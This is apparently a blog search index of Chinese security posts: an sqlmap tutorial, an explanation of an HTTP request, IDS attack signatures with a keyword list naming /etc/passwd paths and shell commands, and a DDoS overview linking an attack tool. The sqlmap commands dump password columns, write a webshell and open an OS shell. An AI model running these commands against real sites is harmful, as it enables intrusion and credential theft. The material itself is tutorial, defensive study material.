<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[sqlmap使用详解]]></title>
    <url>%2F2019%2F01%2F05%2Fsqlmap%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[SQLmap简介 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 4、联合查询注入，可以使用union的情况下的注入。 5、堆查询注入，可以同时执行多条语句的执行时的注入。 sqlmap支持的数据库 MySQL Oracle PostgreSQL Microsoft SQL Server Microsoft Access IBM DB2 SQLite Firebird Sybase SAP MaxDB 工具使用基本格式sqlmap -u “http://www.vuln.cn/post.php?id=1” 默认使用level1检测全部数据库类型 sqlmap -u “http://www.vuln.cn/post.php?id=1” –dbms mysql –level 3 指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面） 跟随302跳转当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302， 当注入错误的时候，先报错再跳转的时候，不需要跟随302。 目的就是：要追踪到错误信息。 cookie注入当程序有防get注入的时候，可以使用cookie注入 sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11” –level 2（只有level达到2才会检测cookie） 从post数据包中注入可以使用burpsuite或者temperdata等工具来抓取post包 sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql 指定username参数 注入成功后获取数据库基本信息sqlmap -u “http://www.vuln.cn/post.php?id=1” –dbms mysql –level 3 –dbs 查询有哪些数据库 sqlmap -u “http://www.vuln.cn/post.php?id=1” –dbms mysql –level 3 -D test –tables 查询test数据库中有哪些表 sqlmap -u “http://www.vuln.cn/post.php?id=1” –dbms mysql –level 3 -D test -T admin –columns 查询test数据库中admin表有哪些字段 sqlmap -u “http://www.vuln.cn/post.php?id=1” –dbms mysql –level 3 -D test -T admin -C “username,password” –dump dump出字段username与password中的数据 其他命令参考下面 从数据库中搜索字段sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password 在dedecms数据库中搜索字段admin或者password。 读取与写入文件首先找需要网站的物理路径，其次需要有可写或可读权限。 –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径） –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell） –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 示例： sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php” 使用shell命令： sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell 接下来指定网站可写目录：“E:\php\htdocs\dvwa” 注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数） sqlmap详细命令 –is-dba 当前用户权限（是否为root权限） –dbs 所有数据库 –current-db 网站当前数据库 –users 所有数据库用户 –current-user 当前数据库用户 –random-agent 构造随机user-agent –passwords 数据库密码 –proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理 –time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒） Options（选项） –version 显示程序的版本号并退出 -h, –help 显示此帮助消息并退出 -v VERBOSE 详细级别：0-6（默认为1） 保存进度继续跑： sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度 sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度 Target（目标）以下至少需要设置其中一个选项，设置目标URL。 -d DIRECT 直接连接到数据库。 -u URL, –url=URL 目标URL。 -l LIST 从Burp或WebScarab代理的日志中解析目标。 -r REQUESTFILE 从一个文件中载入HTTP请求。 -g GOOGLEDORK 处理Google dork的结果作为目标URL。 -c CONFIGFILE 从INI配置文件中加载选项。 Request（请求）：这些选项可以用来指定如何连接到目标URL。 –data=DATA 通过POST发送的数据字符串 –cookie=COOKIE HTTP Cookie头 –cookie-urlencode URL 编码生成的cookie注入 –drop-set-cookie 忽略响应的Set – Cookie头信息 –user-agent=AGENT 指定 HTTP User – Agent头 –random-agent 使用随机选定的HTTP User – Agent头 –referer=REFERER 指定 HTTP Referer头 –headers=HEADERS 换行分开，加入其他的HTTP头 –auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM) –auth-cred=ACRED HTTP身份验证凭据（用户名:密码） –auth-cert=ACERT HTTP认证证书（key_file，cert_file） –proxy=PROXY 使用HTTP代理连接到目标URL –proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码） –ignore-proxy 忽略系统默认的HTTP代理 –delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒 –timeout=TIMEOUT 等待连接超时的时间（默认为30秒） –retries=RETRIES 连接超时后重新连接的时间（默认3） –scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式 –safe-url=SAFURL 在测试过程中经常访问的url地址 –safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL Enumeration（枚举）这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。 -b, –banner 检索数据库管理系统的标识 –current-user 检索数据库管理系统当前用户 –current-db 检索数据库管理系统当前数据库 –is-dba 检测DBMS当前用户是否DBA –users 枚举数据库管理系统用户 –passwords 枚举数据库管理系统用户密码哈希 –privileges 枚举数据库管理系统用户的权限 –roles 枚举数据库管理系统用户的角色 –dbs 枚举数据库管理系统数据库 -D DBname 要进行枚举的指定数据库名 -T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns） –tables 枚举的DBMS数据库中的表 –columns 枚举DBMS数据库表列 –dump 转储数据库管理系统的数据库中的表项 –dump-all 转储所有的DBMS数据库表中的条目 –search 搜索列（S），表（S）和/或数据库名称（S） -C COL 要进行枚举的数据库列 -U USER 用来进行枚举的数据库用户 –exclude-sysdbs 枚举表时排除系统数据库 –start=LIMITSTART 第一个查询输出进入检索 –stop=LIMITSTOP 最后查询的输出进入检索 –first=FIRSTCHAR 第一个查询输出字的字符检索 –last=LASTCHAR 最后查询的输出字字符检索 –sql-query=QUERY 要执行的SQL语句 –sql-shell 提示交互式SQL的shell Optimization（优化）这些选项可用于优化SqlMap的性能。 -o 开启所有优化开关 –predict-output 预测常见的查询输出 –keep-alive 使用持久的HTTP（S）连接 –null-connection 从没有实际的HTTP响应体中检索页面长度 –threads=THREADS 最大的HTTP（S）请求并发量（默认为1） Injection（注入）这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。 -p TESTPARAMETER 可测试的参数（S） –dbms=DBMS 强制后端的DBMS为此值 –os=OS 强制后端的DBMS操作系统为这个值 –prefix=PREFIX 注入payload字符串前缀 –suffix=SUFFIX 注入payload字符串后缀 –tamper=TAMPER 使用给定的脚本（S）篡改注入数据 Detection（检测）：这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。 –level=LEVEL 执行测试的等级（1-5，默认为1） –risk=RISK 执行测试的风险（0-3，默认为1） –string=STRING 查询时有效时在页面匹配字符串 –regexp=REGEXP 查询时有效时在页面匹配正则表达式 –text-only 仅基于在文本内容比较网页 Techniques（技巧）：这些选项可用于调整具体的SQL注入测试。 –technique=TECH SQL注入技术测试（默认BEUST） –time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒） –union-cols=UCOLS 定列范围用于测试UNION查询注入 –union-char=UCHAR 用于暴力猜解列数的字符 Fingerprint（指纹） -f, –fingerprint 执行检查广泛的DBMS版本指纹 Brute force（蛮力）：这些选项可以被用来运行蛮力检查。 –common-tables 检查存在共同表 –common-columns 检查存在共同列 User-defined function injection（用户自定义函数注入）：这些选项可以用来创建用户自定义函数。 –udf-inject 注入用户自定义函数 –shared-lib=SHLIB 共享库的本地路径 File system access（访问文件系统）：这些选项可以被用来访问后端数据库管理系统的底层文件系统。 –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 Operating system access（操作系统访问）：这些选项可以用于访问后端数据库管理系统的底层操作系统。 –os-cmd=OSCMD 执行操作系统命令 –os-shell 交互式的操作系统的shell –os-pwn 获取一个OOB shell，meterpreter或VNC –os-smbrelay 一键获取一个OOB shell，meterpreter或VNC –os-bof 存储过程缓冲区溢出利用 –priv-esc 数据库进程用户权限提升 –msf-path=MSFPATH Metasploit Framework本地的安装路径 –tmp-path=TMPPATH 远程临时文件目录的绝对路径 Windows注册表访问：这些选项可以被用来访问后端数据库管理系统Windows注册表。 –reg-read 读一个Windows注册表项值 –reg-add 写一个Windows注册表项值数据 –reg-del 删除Windows注册表键值 –reg-key=REGKEY Windows注册表键 –reg-value=REGVAL Windows注册表项值 –reg-data=REGDATA Windows注册表键值数据 –reg-type=REGTYPE Windows注册表项值类型 这些选项可以用来设置一些一般的工作参数。 -t TRAFFICFILE 记录所有HTTP流量到一个文本文件中 -s SESSIONFILE 保存和恢复检索会话文件的所有数据 –flush-session 刷新当前目标的会话文件 –fresh-queries 忽略在会话文件中存储的查询结果 –eta 显示每个输出的预计到达时间 –update 更新SqlMap –save file保存选项到INI配置文件 –batch 从不询问用户输入，使用所有默认配置。 Miscellaneous（杂项）： –beep 发现SQL注入时提醒 –check-payload IDS对注入payloads的检测测试 –cleanup SqlMap具体的UDF和表清理DBMS –forms 对目标URL的解析和测试形式 –gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果 –page-rank Google dork结果显示网页排名（PR） –parse-errors 从响应页面解析数据库管理系统的错误消息 –replicate 复制转储的数据到一个sqlite3数据库 –tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址 –wizard 给初级用户的简单向导界面]]></content>
      <categories>
        <category>渗透工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[一次完整的HTTP请求过程]]></title>
    <url>%2F2019%2F01%2F02%2F%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84HTTP%E8%AF%B7%E6%B1%82%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[当我们在游览器地址栏输入www.baidu.com，然后回车，回车这一瞬间页面到底发生了什么呢？ 域名解析 –&gt; 发起TCP的3次握手 –&gt; 建立TCP连接后发起http请求 –&gt; 服务器响应http请求，浏览器得到html代码 –&gt; 浏览器解析html代码，并请求html代码中的资源（如js、css、图片等） –&gt; 浏览器对页面进行渲染呈现给用户 域名解析首先游览器会解析www.baidu.com这个域名（准确来说应该是主机名）对应的IP地址。 游览器会首先搜索游览器自身的DNS缓存（缓存时间比较短，大概只有一分钟，且只能容纳1000条缓存），看自身的缓存中是否有www.baidu.com对应的条目，而且没有过期，如果有且没有过期则解析到此结束。【可以使用 chrome://net-internals/#dns 来进行查看chrome缓存】 如果游览器自身的缓存没有找到相应条目，那么游览器会搜索操作系统自身的DNS缓存，如果找到且没有过期则停止搜索解析到此结束。【可以在命令行下使用 ipconfig /displaydns 来进行查看windows的DNS缓存】 如果在windows系统的DNS缓存也没有找到，那么尝试读取hosts文件（位于C:\Windows\System32\drivers\etc），看这里有没有该域名对应的IP地址，如果有则解析成功。 如果在hosts文件中也没有找到对应的条目，浏览器就会发起一个DNS的系统调用，就会向本地配置的首选DNS服务器（一般是电信运营商提供的，也可以使用像Google提供的DNS服务器）发起域名解析请求（通过的是UDP协议向DNS的53端口发起请求，这个请求是递归的请求，也就是运营商的DNS服务器必须得提供给我们该域名的IP地址），运营商的DNS服务器首先查找自身的缓存，找到对应的条目，且没有过期，则解析成功。如果没有找到对应的条目，则有运营商的DNS代我们的浏览器发起迭代DNS解析请求，它首先是会找根域的DNS的IP地址（这个DNS服务器都内置13台根域的DNS的IP地址），找打根域的DNS地址，就会向其发起请求（请问www.baidu.com这个域名的IP地址是多少啊？），根域发现这是一个顶级域com域的一个域名，于是就告诉运营商的DNS我不知道这个域名的IP地址，但是我知道com域的IP地址，你去找它去，于是运营商的DNS就得到了com域的IP地址，又向com域的IP地址发起了请求（请问www.baidu.com这个域名的IP地址是多少?）,com域这台服务器告诉运营商的DNS我不知道www.baidu.com这个域名的IP地址，但是我知道baidu.com这个域的DNS地址，你去找它去，于是运营商的DNS又向baidu.com这个域名的DNS地址（这个一般就是由域名注册商提供的，像万网，新网等）发起请求（请问www.baidu.com这个域名的IP地址是多少？），这个时候baidu.com域的DNS服务器一查，诶，果真在我这里，于是就把找到的结果发送给运营商的DNS服务器，这个时候运营商的DNS服务器就拿到了www.baidu.com这个域名对应的IP地址，并返回给Windows系统内核，内核又把结果返回给浏览器，终于浏览器拿到了www.baidu.com对应的IP地址。 如果依旧没有解析成功，那么在windows下会进行如下步骤 操作系统就会查找NetBIOS name Cache（NetBIOS名称缓存，就存在客户端电脑中的），那这个缓存有什么东西呢？凡是最近一段时间内和我成功通讯的计算机的计算机名和Ip地址，就都会存在这个缓存里面。什么情况下该步能解析成功呢？就是该名称正好是几分钟前和我成功通信过，那么这一步就可以成功解析。 如果第六步也没有成功，那会查询WINS 服务器（是NETBIOS名称和IP地址对应的服务器）。 如果第七步也没有查询成功，那么客户端就要进行广播查找。 如果第八步也没有成功，那么客户端就读取LMHOSTS文件（和HOSTS文件同一个目录下，写法也一样） 如果第九步还没有解析成功，那么就宣告这次解析失败，那就无法跟目标计算机进行通信。只要这九步中有一步可以解析成功，那就可以成功和目标计算机进行通信。 发起TCP的三次握手拿到域名对应的IP地址之后，User-Agent（一般指游览器）会以一个随机端口（1024&lt;端口&lt;65535）向服务器的WEB程序（常用的有httpd、nginx等）80端口发起TCP的连接请求。这个连接请求（原始的http请求经过TCP/IP四层模型的层层封包）到达服务器端后（这中间通过各种路由设备，局域网内除外），进入到网卡，然后是进入到内核的TCP/IP协议栈（用于识别该连接请求，解封包，一层一层的剥开），还有可能要经过Netfilter防火墙（属于内核的模块）的过滤，最终到达WEB程序，最终建立了TCP/IP连接。 1） Client首先发送一个连接试探，ACK=0 表示确认号无效，SYN = 1 表示这是一个连接请求或连接接受报文，同时表示这个数据报不能携带数据，seq = x 表示Client自己的初始序号（seq = 0 就代表这是第0号包），这时候Client进入syn_sent状态，表示客户端等待服务器的回复 2） Server监听到连接请求报文后，如同意建立连接，则向Client发送确认。TCP报文首部中的SYN 和 ACK都置1 ，ack = x + 1表示期望收到对方下一个报文段的第一个数据字节序号是x+1，同时表明x为止的所有数据都已正确收到（ack=1其实是ack=0+1,也就是期望客户端的第1个包），seq = y 表示Server 自己的初始序号（seq=0就代表这是服务器这边发出的第0号包）。这时服务器进入syn_rcvd，表示服务器已经收到Client的连接请求，等待client的确认。 3） Client收到确认后还需再次发送确认，同时携带要发送给Server的数据。ACK 置1 表示确认号ack= y + 1 有效（代表期望收到服务器的第1个包），Client自己的序号seq= x + 1（表示这就是我的第1个包，相对于第0个包来说的），一旦收到Client的确认之后，这个TCP连接就进入Established状态，就可以发起http请求了。 为什么TCP需要三次握手2个计算机通信是靠协议（目前流行的TCP/IP协议）来实现,如果2个计算机使用的协议不一样，那是不能进行通信的，所以这个3次握手就相当于试探一下对方是否遵循TCP/IP协议，协商完成后就可以进行通信了，当然这样理解不是那么准确。 为什么HTTP协议要基于TCP来实现？目前在Internet中所有的传输都是通过TCP/IP进行的，HTTP协议作为TCP/IP模型中应用层的协议也不例外，TCP是一个端到端的可靠的面向连接的协议，所以HTTP基于传输层TCP协议不用担心数据的传输的各种问题。 建立TCP连接后发起http请求进过TCP三次握手之后，浏览器发起了http的请求。 http请求报文内容和格式可自行抓包查看。 服务器端响应http请求，浏览器得到html代码服务器端WEB程序接收到http请求以后，就开始处理该请求，处理之后就返回给浏览器html文件。 那到底服务器端接收到http请求后是怎么样生成html文件？假设服务器端使用nginx+PHP(fastcgi)架构提供服务 nginx读取配置文件我们在浏览器的地址栏里面输入的是 http://www.baidu.com （http://可以不用输入，浏览器会自动帮我们添加），其实完整的应该是http://www.baidu.com./ 后面还有个点（这个点代表就是根域，一般情况下我们不用输入，也不显示）,后面的/也是不用添加，浏览器会自动帮我们添加，那么实际请求的URL是http://www.baidu.com/，那么好了Nginx在收到 浏览器 GET / 请求时，会读取http请求里面的头部信息，根据Host来匹配 自己的所有的虚拟主机的配置文件的server_name,看看有没有匹配的，有匹配那么就读取该虚拟主机的配置，发现如下配置： root /web/echo 通过这个就知道所有网页文件的就在这个目录下 这个目录就是/ 当我们http://www.baidu.com/时就是访问这个目录下面的文件，例如访问http://www.baidu.com/index.html,那么代表/web/echo下面有个文件叫index.html index index.html index.htm index.php 通过这个就能得知网站的首页文件是那个文件，也就是我们在入http://www.baidu.com/ ，nginx就会自动帮我们把index.html（假设首页是index.php 当然是会尝试的去找到该文件，如果没有找到该文件就依次往下找，如果这3个文件都没有找到，那么就抛出一个404错误）加到后面，那么添加之后的URL是/index.php,然后根据后面的配置进行处理。 location ~ .*\.php(\/.*)*$ { root /web/echo; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; astcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } 这一段配置指明凡是请求的URL中匹配（这里是启用了正则表达式进行匹配） *.php后缀的（后面跟的参数）都交给后端的fastcgi进程进行处理。 把php文件交给fastcgi进程去处理于是nginx把/index.php这个URL交给了后端的fastcgi进程处理，等待fastcgi处理完成后（结合数据库查询出数据，填充模板生成html文件）返回给nginx一个index.html文档，Nginx再把这个index.html返回给浏览器，于是乎浏览器就拿到了首页的html代码，同时nginx写一条访问日志到日志文件中去。 nginx是怎么找index.php文件的？当nginx发现需要/web/echo/index.php文件时，就会向内核发起IO系统调用(因为要跟硬件打交道，这里的硬件是指硬盘，通常需要靠内核来操作，而内核提供的这些功能是通过系统调用来实现的)，告诉内核，我需要这个文件,内核从/开始找到web目录，再在web目录下找到echo目录，最后在echo目录下找到index.php文件，于是把这个index.php从硬盘上读取到内核自身的内存空间，然后再把这个文件复制到nginx进程所在的内存空间，于是乎nginx就得到了自己想要的文件了。 浏览器解析html代码，并请求html代码中的资源浏览器拿到index.html文件后，就开始解析其中的html代码，遇到js/css/image等静态资源时，就向服务器端去请求下载（会使用多线程下载，每个浏览器的线程数不一样），这个时候就用上keep-alive特性了，建立一次HTTP连接，可以请求多个资源，下载资源的顺序就是按照代码里的顺序，但是由于每个资源大小不一样，而浏览器又多线程请求请求资源，所以顺序并不一定是代码里面的顺序。 浏览器在请求静态资源时（在未过期的情况下），向服务器端发起一个http请求（询问自从上一次修改时间到现在有没有对资源进行修改），如果服务器端返回304状态码（告诉浏览器服务器端没有修改），那么浏览器会直接读取本地的该资源的缓存文件。 浏览器对页面进行渲染呈现给用户最后，浏览器利用自己内部的工作机制，把请求到的静态资源和html代码进行渲染，渲染之后呈现给用户。 自此一次完整的HTTP事务宣告完成.]]></content>
      <categories>
        <category>网络及协议</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[入侵检测与入侵防御]]></title>
    <url>%2F2019%2F01%2F01%2F%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[入侵行为的特征分类 利用某些终端协议机制缺陷，识别入侵行为； 利用畸形IP数据包特征，识别入侵行为； 利用TCP报文中的畸形标记组合，识别攻击行为； 利用日志或数据部分的特殊组合，识别入侵行为； 利用网络协议的缺陷，识别入侵行为。 针对ARP缺陷的攻击 ARP的作用是找出指定IP地址对应的MAC地址。 由请求主机以本网广播方式，发出ARP请求。目标主机以单播方式，向申请主机回应ARP应答信息，完成IP–&gt;MAC地址的过程。 入侵行为特征针对TCP标记的攻击带有非法TCP标志组合的数据包：可通过对比TCP报头中的标志集与已知正确和错误标记组合的不同点来识别。 TCP SYN拒绝服务攻击攻击者向目标计算机发送大量的TCPSYN报文，不回应目标计算机的SYN+ACK报文，这样导致目标计算机一致处于等待状态，消耗目标计算机内存，直至瘫痪。一般，攻击者会采用大量虚假的源IP地址，对目标系统进行攻击。 特征：伪造一个虚假的源IP地址仅发送一个SYN报文。 SYN和FIN标志攻击攻击者向目标计算机发送一个TCP连接报文，将SYN标志和FIN标志都设置为1。这样的畸形报文，由于某些操作系统中，没有处理此类畸形报文的逻辑，造成目标系统瘫痪。 特征：TCP报文的SYN和FIN标记都设置为1。 没有设置任何标志的TCP报文攻击正常情况下，任何TCP报文的SYN、FIN、ACK、RST、PSH五个标志中至少有一个标志为1。请求TCP报文设置SYN标志，后续报文都设置ACK标志。 特征：攻击者发送的TCP报文所有的TCP标志位都为0。 WinNuke攻击利用了WINDOWS操作系统的一个漏洞，向这个139端口发送一些携带TCP带外（OOB）数据报文，但其指针字段与数据的实际位置不符，某些版本的WINDOWS操作系统在处理这些数据的时候，系统就会崩溃。 利用漏洞Windows系统TCP/IP 00B带外紧急数据拒绝 服务攻击漏洞 影响系统 Windows NT 3.5 Windows 95 攻击效果 攻击端口通常为139 被攻击服务器蓝屏 变种攻击 WinNuke2 Pnuke 防护方法 防火墙过滤 打补丁 特征：带外数据长度与数据长度之和不等于真实数据部分长度。 Land攻击通过向一个目标计算机发送大量的TCP SYN报文，报文的源IP地址和目的IP地址是相同的，都是目标计算机的IP地址。这样目标计算机接收到这个SYN报文后，就会向该报文的源地址发送一个ACK报文，并建立一个TCP连接控制结构（TCB），而该报文的源地址就是自己，因此，这个ACK报文就发给了自己。这样目标计算机就会产生大量的处于半连接状态的TCB块，可能会耗尽内存，最终不能正常服务。这也是一种DOS攻击。 特征：TCP SYN报文中，源IP与目的IP相同，均指向受害主机。 针对IP缺陷的攻击利用畸形IP数据包特征，识别入侵行为。 分片IP报文攻击当一些较大的IP数据包通过MTU（最大传输单元）较小的网络，就需要进行分片传送。源主机或传输路径上的路由器，均可能进行分片。在IP报头中，与分片相关的有标志字段、分片偏移字段、分片许可位和分片标志位（MF）等，某些字段可用于指导接收方对IP分片的重组。 假如攻击者仅发送了其中的第一个分片或某个分片，其他的分片不发送，则接收方会等待一段时间（等待的时间视具体系统不同而不同），在超时后，接收方会丢弃受到的不完整分片。当攻击者发送大量的残缺分片，则接收方或因等待过多分片而耗尽内存，导致瘫痪。 特征：属于某个原始IP数据包的分片没有全部发送，需要判断各分片之间是否满足关系，最后一个分片是否发送。 滴泪攻击假如攻击者对正常分片的情况进行修改，把偏移字段设置成不正确的值，在分片重组的时候，可能出现数据覆盖或断开的情况，就可能导致目标操作系统崩渍。 比如，将偏移字段值设置为0，150，370，555，会发生数据覆盖；而将其修改为0，185，370，580，则会出现数据断开，这就是所谓的泪滴攻击。 特征：各分片之间偏移值、数据包长度、首部长度之间不满足紧密衔接关系。 带源路由选项的IP报文源路由选项的目的，是指明IP数据包需要通过对中间设备（路由器），即指明了报文的传输路径。源路由选项有两类，一类是严格的源路由，另一类是松散的源路由。 这些带源路由选项的IP报文在传输的过程中，其源地址不断改变，目标地址也不断改变，因此，通过合适的设置源路由节点，攻击者便可以伪造一些合法的IP地址，而蒙混进入内部网络。 特征：采用了源路由选项（代码131、137），其源路由列表中，存在伪造的IP地址（伪造一些访问控制设备允许进入内网的IP地址段，这些IP地址并不是路由器接口的IP）。 记录路由选项的IP报文记录路由选项也是一个IP选项，携带了该选项的IP报文，每经过一台路由器，该路由器便把自己的接口地址填在选项字段里面。这些报文在到达目的地的时候，选项的数据里面便记录了该报文经过的整个路径。 通过这样的报文可以很容易的判断该报文经过的路径，从而使攻击者可以很容易的寻找其中的攻击弱点。 特征：有明显特征。一般做法是，在非调试状态下，禁止使用记录路由选项，对于记录路由选项的IP报文，均认为是入侵行为。 未知协议字段的IP报文在IP报文头中，有一个协议字段，指明了该IP报文承载了何种协议的数据。如果该字段值为1，则表明该IP报文承载了ICMP报文；6，则是TCP报文等。若攻击者将此字段设置为一个表示空协议的值，这样的报文可能对一些计算机操作系统的协议栈造成破坏。 特征：IP数据包中的协议字段的值，不代表具体的某个协议。 IP地址欺骗般情况下，路由器在转发报文的时候，只根据报文的目的地址查路由表，而不管报文的源地址是什么，攻击者向一台目标计算机发出一个报文，而把报文的源地址填写为第三方的一个IP地址，这样目标计算机便可能向毫无知觉的第三方计算机回应。 特征：数据包的源IP地址字段值与其发送的报文的网络接口的IP地址不一致。 针对ICMP缺陷的攻击ICMP泛洪攻击者向目标计算机发送大量的ICMP ECHO请求报文（产生ICMP泛洪），则目标计算机会忙于处理并回应这些ECHO报文，而无法继续处理其它的网络数据报文，造成目标系统瘫痪。 特征：攻击者发送ICMP ECHO报文太频繁，可设置一个阈值。 死亡之pingTCP/IP规范要求IP报文的长度在一定范围内（比如，64B-64KB，但对发送方，没有此限制）。当接收到大于64KB长度的PING报文，可能导致目标系统IP协议栈崩溃，系统瘫痪。 特征：ping数据包的长度大于常规长度大于64K-20。 Smurf攻击攻击者把ECHO的源地址设置为一个广播地址，在回复reply的时候，就会以广播地址为目的地址，这样本地网络上所有的计算机都必须处理这些广播报文。如果攻击者发送的ECHO请求报文足够多，产生的reply广播风暴，就可能把整个网络淹没。攻击者还可能把源地址设置为一个子网的广播地址或者受害者的主机的IP地址。 这样，该子网所在的计算机就可能受影响或者某个主机就会被ICMP REPLY淹没，造成瘫疾。 特征：ECHO报文的源地址为网段广播地址或与发送者IP不同的地址。 针对UDP攻击由于UDP协议是一种无连接的服务，攻击者可发送大量伪造源IP地址的小UDP包。但是，由于UDP协议是无连接性的，所以只要开了一个UDP服务的话，就可能被攻击。 UDP Flood是流量型DoS攻击。通常是利用大量UDP小包冲击DNS或Radius认证和流媒体视频服务器等提供UDP服务的服务器。 特征：发送到目标IP的频率大于1k pps。小包攻击的UDP数据包，通常大小不大于200字节；打包攻击的UDP Flood数据包长通常大于1500字节。 UDP Flood非常难以检测，因为没有连接过程，无法建立连接状态。 针对路由协议攻击因特网的工作原理是由终端主机，将IP数据包发送给路由设备，然后由路由设备根据自身学习到的或者人工设定的路由表，将IP数据包按照接力转发的方式，最终送到目标IP地址。 路由信息自动更新，路由器要根据拓扑变化，重新计算路由，并快速扩散到各相关路由器。 发送虚假的路由更新报文，将导致消耗路由器资源、引起网络中断、甚至引起网络路由更新报文风暴，阻塞网络。 内容特征URL中包含：../../etc/passwd，../../etc/shadow 内容中包含：format、delete、copy、net、at、1s、mv、su、chgrp、chmod、chown、chattr、sudo、adduser、groupadd、kill等命令字 CREATE、BACKUP、drop、Alter、‘，–，delete、Insert、Union、update、exec等危险、敏感关键字猜测用户名密码的尝试、上传下载命令、修改显示备份删除文件操作、读取修改配置操作、注册表操作、cookie读取等操作]]></content>
      <categories>
        <category>入侵检测</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[DDOS]]></title>
    <url>%2F2018%2F12%2F28%2FDDOS%2F</url>
    <content type="text"><![CDATA[DDOS攻击是一个世界级难题，并没有解决办法，只能缓解 DDoS（Distributed Denial of Service，分布式拒绝服务）攻击的主要目的是让指定目标无法提供正常服务，甚至从互联网上消失，是目前最强大、最难防御的攻击之一。这是一个世界级的难题并没有解决办法只能缓解. 按照发起的方式，DDoS可以简单分为三类。 第一类以力取胜，海量数据包从互联网的各个角落蜂拥而来，堵塞IDC入口，让各种强大的硬件防御系统、快速高效的应急流程无用武之地。这种类型的攻击典型代表是ICMP Flood和UDP Flood，现在已不常见。 第二类以巧取胜，灵动而难以察觉，每隔几分钟发一个包甚至只需要一个包，就可以让豪华配置的服务器不再响应。这类攻击主要是利用协议或者软件的漏洞发起，例如Slowloris攻击、Hash冲突攻击等，需要特定环境机缘巧合下才能出现。 第三类是上述两种的混合，轻灵浑厚兼而有之，既利用了协议、系统的缺陷，又具备了海量的流量，例如SYN Flood攻击、DNS Query Flood攻击，是当前的主流攻击方式。 SYN FloodSYN Flood是互联网上最经典的DDOS攻击方式之一，他是利用了TCP三次握手的缺陷，能够以比较小的代价使目标服务器无法响应，且难以追查。 标准的TCP三次握手过程如下： 客户端发送一个包含SYN标志的TCP报文，SYN即同步（Synchronize），同步报文会指明客户端使用的端口以及TCP连接的初始序号； 服务器在收到客户端的SYN报文后，将返回一个SYN+ACK（即确认Acknowledgement）的报文，表示客户端的请求被接受，同时TCP初始序号自动加1； 客户端也返回一个确认报文ACK给服务器端，同样TCP序列号被加1。 经过这三步，TCP连接就建立完成。 TCP协议为了实现可靠传输，在三次握手的过程中设置了一些异常处理机制。第三步中如果服务器没有收到客户端的最终ACK确认报文，会一直处于SYN_RECV状态，将客户端IP加入等待列表，并重发第二部的SYN+ACK报文。一般重发3-5次，大约间隔30秒左右轮询一次等待列表重试所有客户端。 另一方面，服务器在自己发出了SYN+ACK报文后，会预分配资源为即将建立的TCP连接储存信息做准备，这个资源在等待重试期间一直保留。更为重要的是，服务器资源有限，可以维护的SYN_RECV状态超过基线后就不再接受新的SYN报文，也就是拒绝新的TCP连接建立。 攻击者可以伪装大量的IP地址给服务器发送SYN报文，由于伪造的IP地址几乎不可能存在，也就几乎没有设备会给服务器返回任何应答了。因此，服务器将会维持一个庞大的等待列表，不停的重试发送SYN+ACK报文，同时占用着大量的资源无法释放。更为关键的是，被攻击服务器的SYN_RECV队列被恶意的数据包占满，不再接受新的SYN请求，合法用户无法建立TCP连接。 攻击软件DarkShell http://www.77169.org/hack/201508/205870.shtm DNS Query Flood作为互联网最基础、最核心的服务，DNS自然也是DDOS攻击的重要目标之一。 UDP攻击是最容易发起海量流量的攻击手段，而且源IP随机伪造难以追查，但是过滤比较容易，因为大多数IP并不提供UDP服务，直接丢弃UDP流量即可。所以现在纯粹的UDP流量攻击少见了，取而代之的是UDP协议承载的DNS Query Flood攻击。简单的说，越上层协议上发动的DDOS攻击越难以防御，因为协议越上层，与业务关联越大，防御系统面临的情况就越复杂。 DNS Query 